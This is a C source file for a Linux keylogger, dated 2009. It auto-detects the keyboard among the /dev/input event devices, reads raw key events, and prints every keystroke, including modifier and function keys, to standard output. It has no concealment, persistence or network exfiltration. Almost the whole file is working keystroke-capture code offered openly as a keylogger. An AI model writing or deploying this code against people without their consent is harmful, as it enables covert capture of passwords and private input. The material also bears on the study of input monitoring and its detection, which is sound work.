/**
 * @file   keylogger.c
 * @author Adam Risi <ajrisi@gmail.com>
 * @date   Thu Sep 17 23:42:54 2009
 * 
 * @brief  A keylogger written in C, uses the /dev/input/device method
 * 
 * 
 */

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <dirent.h>

char translate[]      = "  1234567890-=\b\tqwertyuiop[]\n asdfghjkl;'   zxcvbnm,./ *                                                                       ";
char translateshift[] = "  !@#$%^&*()_+\b\tQWERTYUIOP{}\n ASDFGHJKL:'   ZXCVBNM<>? *                                                                       ";


#define PATH "/dev/input/"

#define PROBE_FAILED -1
#define PROBE_MATCH 1 

#define SHIFT_L 42
#define SHIFT_R 54

#define PRINT_SHIFT 0 

#define LONG_BITS (sizeof(long) * 8)
#define NBITS(x) (((x) + LONG_BITS - 1) / LONG_BITS)
#define TestBit(bit, array) (array[(bit) / LONG_BITS]) & (1 << ((bit) % LONG_BITS))



int test_device (char *buf)
{
  int fd;
  int results;
  char rep[2];

  if ((fd = open (buf, O_RDONLY | O_NONBLOCK)) >= 0) {

    /* a clever little hack, this looks for device that has the repeat option set - 
       this is normally just the keyboard */
    if(ioctl(fd, EVIOCGREP, rep)) {
      results = PROBE_FAILED;
    } else {
      /* this is probably the keyboard */
      results = PROBE_MATCH;
    }
    
    close(fd);

  } else {
    results = PROBE_FAILED;
  }
  return results;
}

/*
 * Check each device in /dev/input and determine if
 * it is a keyboard device
 */

char * scan_for_devices (char *path)
{

  DIR *event_devices = opendir (PATH);
  struct dirent *dir = NULL;
  int found = PROBE_FAILED;
  
  if (event_devices == NULL) {
    printf ("Cannot open the event interface directory (%s)\n", PATH);
    perror("opendir()");
    exit(1);
  }
  
  // scan through /dev/input/* checking for activity whilst simulating keyboard activity
  while ((dir = readdir (event_devices)) != NULL && (found != PROBE_MATCH)) {
    // ignore this and parent directory
    if ((strncmp (dir->d_name, ".", 1)) != 0) {
      snprintf (path, 1024, "%s%s", PATH, dir->d_name);
      //printf ("\ttrying %s", dir->d_name);
      found = test_device (path);
    }
  }
  
  if (found == PROBE_MATCH) {
    return path;
  } else {
    return NULL;
  }
} 


int main(int argc, char **argv) 
{
  int kb;
  char dev_name[256];
  char *dev_path;
  char *auto_dev_path;
  int err;
  struct input_event ev[64] = {0};
  int yalv;
  size_t rb = 0;
  int shift = 0;

  if(argc > 2) {
    fprintf(stderr, "usage: %s [keyboard_device]\n", argv[0]);
    exit(1);
  }


  auto_dev_path = malloc(256);
  if(auto_dev_path == NULL) {
    fprintf(stderr, "Could not alloc. for auto dev path");
    exit(1);
  }
  memset(auto_dev_path, 0, 256);

  /* Clear out dev_name and set it to unknown */
  memset(dev_name, 0, sizeof(dev_name));
  strcpy(dev_name, "Unknown");

  /* attempt to detect the keyboard device */
  if(argc == 1) {
    if(scan_for_devices(auto_dev_path) != NULL) {
      dev_path = auto_dev_path;
    } else {
      fprintf(stderr, "Could not auto find the keyboard\n");
    }
  } else {
    dev_path = argv[1];
  }

  /**
   * Open the device, and verify it opened properly
   * 
   */
  kb = open(dev_path, O_RDONLY);
  if(kb < 0) {
    fprintf(stderr, "Could not open keyboard device: %s\n", argv[1]);
    exit(1);
  }


  while(1) {
    rb=read(kb,ev,sizeof(struct input_event));
    
    if (rb < (int) sizeof(struct input_event)) {
      perror("evtest: short read");
      exit (1);
    }
    
    for (yalv = 0; yalv < (int) (rb / sizeof(struct input_event)); yalv++) {

      if (EV_KEY == ev[yalv].type) {
	char c = ev[yalv].code;

    	/* a key-release, only matters if we are letting off shift */
	if(ev[yalv].value == 0) {

	  switch (c) {
	  case 1: printf("<esc-up>"); break;
	  case 14: printf("<backspace-up>"); break;
	  case 15: printf("<tab-up>"); break;
	  case 42: {
	    if(PRINT_SHIFT) printf("<shift-l-up>"); 
	    shift=0;
	  } break;
	  case 54: {
	    if(PRINT_SHIFT) printf("<shift-r-up>");
	    shift=0;
	  } break;
	  case 29: printf("<ctrl-up>"); break;
	  case 56: printf("<alt-up>"); break;
	  case 82: printf("<ins-up>"); break;
	  case 83: printf("<del-up>"); break;
	  }
	  
	} else {
	  switch (c) {
	  case 1: printf("<esc>"); break;
	  case 14: printf("<backspace>"); break;
	  case 15: printf("<tab>"); break;
	  case 28: printf("\n"); /* timestamp */ break;
	  case 42: {
	    if(PRINT_SHIFT) printf("<shift-l>"); 
	    shift=1;
	  } break;
	  case 54: {
	    if(PRINT_SHIFT) printf("<shift-r>");
	    shift=1;
	  } break;
	  case 29: printf("<ctrl>"); break;
	  case 56: printf("<alt>"); break;
	  case 82: printf("<ins>"); break;
	  case 83: printf("<del>"); break;
	  case 71: printf("<home>"); break;
	  case 79: printf("<end>"); break;
	  case 73: printf("<pgup>"); break;
	  case 81: printf("<pgdn>"); break;
	  case 72: printf("<up>"); break;
	  case 80: printf("<down>"); break;
	  case 75: printf("<left>"); break;
	  case 77: printf("<right>"); break;
	  case 59: printf("<f1>"); break;
	  case 60: printf("<f2>"); break;
	  case 61: printf("<f3>"); break;
	  case 62: printf("<f4>"); break;
	  case 63: printf("<f5>"); break;
	  case 64: printf("<f6>"); break;
	  case 65: printf("<f7>"); break;
	  case 66: printf("<f8>"); break;
	  case 67: printf("<f9>"); break;
	  case 68: printf("<f10>"); break;
	  case 87: printf("<f11>"); break;
	  case 88: printf("<f12>"); break;
	    
	  default: {
	    printf("%c", shift ? translateshift[c] : translate[c] );
	  }
	    
	  } /* switch the character */
	} /* the else, is a down or repeat */
	fflush(0);
      } /* is a key press event */
    } /* for each read key */
  } /* forever loop */
  
  close(kb);
  return 0;
}
  
